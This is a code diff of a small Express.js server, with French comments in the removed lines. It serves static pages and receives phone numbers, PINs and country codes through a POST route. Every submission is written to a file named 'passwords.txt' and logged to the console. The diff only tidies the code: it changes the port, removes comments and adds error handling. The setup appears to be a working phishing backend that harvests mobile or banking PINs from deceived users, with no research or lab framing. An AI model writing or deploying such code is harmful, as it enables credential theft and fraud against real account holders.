@@ -4,42 +4,36 @@ const path = require("path");
 const cors = require("cors");
 
 const app = express();
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 
-
-// Middleware
 app.use(cors());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json()); // indispensable pour fetch JSON
+app.use(express.json());
 
-// Dossier statique
 app.use(express.static(path.join(__dirname, "..", "STOKE")));
 
-// Fichier où les données seront sauvegardées
 const FILE = path.join(__dirname, "passwords.txt");
 
-// Route POST pour recevoir phone, pin et country
 app.post("/", (req, res) => {
-    const { phone, pin, country } = req.body; // ajout de country
+    const { phone, pin, country } = req.body;
 
-     // 🔍 Logs sur Render
     console.log("REQ BODY :", req.body);
-    console.log("COUNTRY :", country);
-    console.log("PHONE   :", phone);
-    console.log("PIN     :", pin);
 
     if (!phone || !pin || !country) {
-        console.log("❌ Données manquantes");
-        return res.sendStatus(400);
+        return res.status(400).send("Missing data");
     }
-     // Sauvegarde dans le fichier
-    const line = `COUNTRY: ${country} | PHONE: ${phone} | PIN: ${pin}\n`;
-    fs.appendFileSync(FILE, line);
 
-    // Réponse simple
+    const line = `COUNTRY=${country} | PHONE=${phone} | PIN=${pin}\n`;
+
+    try {
+        fs.appendFileSync(FILE, line);
+    } catch (err) {
+        console.error("File write error:", err);
+    }
+
     res.sendStatus(200);
 });
 
-// Lancement du serveur
-app.listen(PORT, () => {
-  console.log("Serveur online sur port " + PORT);});
+app.listen(PORT, "0.0.0.0", () => {
+    console.log("Server running on port", PORT);
+});
